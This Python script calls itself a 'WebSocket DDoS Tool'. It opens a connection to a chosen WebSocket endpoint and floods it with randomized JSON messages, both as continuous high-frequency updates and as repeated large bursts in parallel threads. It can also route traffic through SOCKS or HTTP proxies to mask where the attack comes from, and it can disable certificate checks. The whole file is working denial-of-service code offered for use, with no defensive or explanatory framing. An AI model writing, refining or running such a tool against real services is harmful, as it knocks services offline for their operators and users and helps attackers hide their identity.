import websocket
import time
import json
import random
import threading
import ssl
import requests
import socks
import socket
import argparse
import os

def generate_random_value(value_type):
    if isinstance(value_type, dict):
        return {k: generate_random_value(v) for k, v in value_type.items()}
    elif isinstance(value_type, list) and len(value_type) > 0:
        return [generate_random_value(value_type[0]) for _ in range(len(value_type))]
    elif isinstance(value_type, int):
        return random.randint(0, 1000)
    elif isinstance(value_type, float):
        return random.random() * 1000
    elif isinstance(value_type, bool):
        return random.choice([True, False])
    elif isinstance(value_type, str):
        return value_type
    else:
        return value_type

def send_regular_updates(ws, data_template, id_field=None, frequency=1.0, num_items=10, id_prefix="ITEM"):
    delay = 1.0 / frequency
    try:
        while True:
            for i in range(num_items):
                data = json.loads(json.dumps(data_template)) 
                
                for key, value in data.items():
                    if key != id_field:
                        data[key] = generate_random_value(value)
                
                if id_field and id_field in data:
                    data[id_field] = f"{id_prefix}{i}"
                
                if "timestamp" not in data and not any("timestamp" in str(k).lower() for k in data.keys()):
                    data["timestamp"] = int(time.time())
                
                try:
                    ws.send(json.dumps(data))
                    print(f"Sent data for item {i}")
                except Exception as e:
                    print(f"Error sending data: {e}")
                    return
            time.sleep(delay)
    except Exception as e:
        print(f"Exception in send_regular_updates: {e}")

def send_burst_updates(ws, data_template, id_field=None, num_items=100, burst_size=50, id_prefix="BURST"):
    print(f"Sending burst of {burst_size} updates for {num_items} items...")
    try:
        for b in range(burst_size):
            for i in range(num_items):
                data = json.loads(json.dumps(data_template))
                
                for key, value in data.items():
                    if key != id_field:
                        data[key] = generate_random_value(value)
                
                if id_field and id_field in data:
                    data[id_field] = f"{id_prefix}{i}"
                
                if "timestamp" not in data and not any("timestamp" in str(k).lower() for k in data.keys()):
                    data["timestamp"] = int(time.time())
                
                ws.send(json.dumps(data))
            print(f"Sent burst #{b+1}/{burst_size}")
    except Exception as e:
        print(f"Error in burst mode: {e}")

def on_open(ws, data_template, id_field, regular_updates_freq, burst_delay, burst_items, burst_size):
    print("Connection opened successfully!")
    
    threading.Thread(target=send_regular_updates, args=(ws, data_template, id_field, regular_updates_freq)).start()
    
    def delayed_burst():
        time.sleep(burst_delay)
        send_burst_updates(ws, data_template, id_field, burst_items, burst_size)
    
    threading.Thread(target=delayed_burst).start()

def on_message(ws, message):
    print(f"Received message: {message}")

def on_error(ws, error):
    print(f"Error occurred: {error}")

def on_close(ws, close_status_code, close_msg):
    print(f"Connection closed. Status code: {close_status_code}, Message: {close_msg}")

def setup_proxy(proxy_type, proxy_addr, proxy_port):
    if proxy_type.lower() == "socks5":
        socks.set_default_proxy(socks.SOCKS5, proxy_addr, proxy_port)
        socket.socket = socks.socksocket
        print(f"SOCKS5 proxy configured: {proxy_addr}:{proxy_port}")
    elif proxy_type.lower() == "socks4":
        socks.set_default_proxy(socks.SOCKS4, proxy_addr, proxy_port)
        socket.socket = socks.socksocket
        print(f"SOCKS4 proxy configured: {proxy_addr}:{proxy_port}")
    elif proxy_type.lower() == "http":
        socks.set_default_proxy(socks.HTTP, proxy_addr, proxy_port)
        socket.socket = socks.socksocket
        print(f"HTTP proxy configured: {proxy_addr}:{proxy_port}")
    else:
        print(f"Unsupported proxy type: {proxy_type}")

    try:
        print("Testing proxy connection...")
        ip_check = requests.get("https://api.ipify.org?format=json", 
                               proxies={
                                   "http": f"{proxy_type.lower()}://{proxy_addr}:{proxy_port}", 
                                   "https": f"{proxy_type.lower()}://{proxy_addr}:{proxy_port}"
                               })
        print(f"Your public IP through proxy: {ip_check.json()['ip']}")
    except Exception as e:
        print(f"Proxy test failed: {e}")

def load_data_template(template_file):
    if not os.path.exists(template_file):
        print(f"Template file {template_file} not found.")
        return None
    
    try:
        with open(template_file, 'r') as f:
            return json.load(f)
    except Exception as e:
        print(f"Error loading template file: {e}")
        return None

def main():
    parser = argparse.ArgumentParser(description="WebSocket DDoS Tool")
    parser.add_argument("--endpoint", required=True, help="WebSocket endpoint URL (wss://example.com/socket)")
    parser.add_argument("--template", help="JSON template file for data structure")
    parser.add_argument("--id-field", help="Field name to use for ID in the data template")
    parser.add_argument("--proxy-type", default="socks5", help="Proxy type (socks5, socks4, http)")
    parser.add_argument("--proxy-addr", default="127.0.0.1", help="Proxy address")
    parser.add_argument("--proxy-port", type=int, default=1080, help="Proxy port")
    parser.add_argument("--frequency", type=float, default=10.0, help="Updates per second")
    parser.add_argument("--burst-delay", type=int, default=5, help="Delay before burst (seconds)")
    parser.add_argument("--burst-items", type=int, default=100, help="Number of items in burst")
    parser.add_argument("--burst-size", type=int, default=50, help="Number of bursts")
    parser.add_argument("--cert-file", help="SSL certificate file path")
    parser.add_argument("--debug", action="store_true", help="Enable debug output")
    parser.add_argument("--skip-ssl-verify", action="store_true", help="Skip SSL certificate verification")
    args = parser.parse_args()

    if args.debug:
        websocket.enableTrace(True)
    
    if args.proxy_addr and args.proxy_port:
        setup_proxy(args.proxy_type, args.proxy_addr, args.proxy_port)
    
    context = ssl.create_default_context()
    if args.skip_ssl_verify:
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        print("SSL certificate verification disabled")
    elif args.cert_file:
        try:
            context.load_verify_locations(args.cert_file)
            print(f"Loaded certificate from {args.cert_file}")
        except Exception as e:
            print(f"Error loading certificate: {e}")
            print("Falling back to default certificates")
    
    data_template = {"message": "test", "timestamp": 0}
    
    if args.template:
        template_data = load_data_template(args.template)
        if template_data:
            data_template = template_data
    
    print(f"Using data template: {json.dumps(data_template, indent=2)}")
    print(f"Connecting to {args.endpoint}...")
    
    ws = websocket.WebSocketApp(
        args.endpoint,
        on_open=lambda ws: on_open(ws, data_template, args.id_field, args.frequency, args.burst_delay, args.burst_items, args.burst_size),
        on_message=on_message,
        on_error=on_error,
        on_close=on_close
    )
    
    try:
        ws.run_forever(sslopt={"context": context})
    except Exception as e:
        print(f"Exception during run_forever: {e}")

if __name__ == "__main__":
    main()